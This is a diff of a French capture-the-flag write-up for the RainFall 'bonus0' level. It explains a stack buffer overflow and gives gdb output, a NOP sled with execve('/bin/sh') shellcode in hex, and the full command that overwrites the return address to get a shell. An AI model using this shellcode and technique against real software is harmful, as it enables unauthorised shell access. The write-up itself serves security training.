@@ -49,7 +49,7 @@ int main(void)
 }
 ```
 
-L'idee est de stocker un shellcode dans `dest` puis d'ecraser l'adresse de retour de `main()` grace au `strcpy()` et `strcat()`. Pour cela il nous faut l'offset a partir duquel ecrire notre adresse de retour et l'adresse du debut de notre shellcode.
+L'idee est de stocker un shellcode dans `dest` puis d'ecraser l'adresse de retour de `pp()` grace a `strcat()`. Pour cela il nous faut l'offset a partir duquel ecrire notre adresse de retour et l'adresse du debut de notre shellcode.
 
 ```bash
 bonus0@RainFall:~$ gdb ./bonus0
@@ -99,13 +99,13 @@ Breakpoint 1, 0x080484bd in p ()
 0xbfffe680:     0x00000000
 ```
 
-Ensuite nous devons stocker notre shellcode assez loin dans la memoir pour qu'il ne soit pas ecrase la suite de notre programme. Nous allons donc avoir un padding d'au moins 61 car nous pouvons ecrire 61 characteres au total `(40 + 1 + 2 -> (first overflow) + ' ' + second)`. Nous pouvons ecraser egalement toute marge d'erreur en utilisant l'instruction `NOP (\x90)`. Donc voici la 1ere partie de notre paylaod:
+Ensuite nous devons stocker notre shellcode assez loin dans la memoire pour qu'il ne soit pas ecrase par la suite de notre programme. Nous allons donc avoir un padding d'au moins 61 car nous pouvons ecrire 61 characteres au total `(40 + 1 + 20 -> (first overflow) + ' ' + second)`. Nous pouvons ecraser egalement toute marge d'erreur en utilisant l'instruction `NOP (\x90)`. Donc voici la 1ere partie de notre paylaod:
 
 ```bash
 python3 -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'
 ```
 
-Nous pouvons maintenant nous attaquer a la second partie du payload qui est l'ecrasement de l'adresse de retour. Nous connaissons deja l'adresse de notre payload grace aux `NOP`: `(0xbfffe680 + 61, 0xbfffe680 + 100) = (0xbfffe6bd, 0xbfffe6e4)`. Nous connaissons aussi l'offset a partir duquel ecrire cette adresse: 9. Donc voici notre payload complet:
+Nous pouvons maintenant nous attaquer a la second partie du payload qui est l'ecrasement de l'adresse de retour. Nous connaissons deja l'adresse de notre payload grace aux `NOP`: `(0xbfffe680 + 61, 0xbfffe680 + 100) = (0xbfffe6bd, 0xbfffe6e4)`. Nous connaissons aussi l'offset a partir duquel ecrire cette adresse: `9`. Donc voici notre payload complet:
 
 ```bash
 bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' ; python -c 'print "A" * 9 + "\xc7\xe6\xff\xbf" + "A" * 7' ; cat ) | ./bonus0
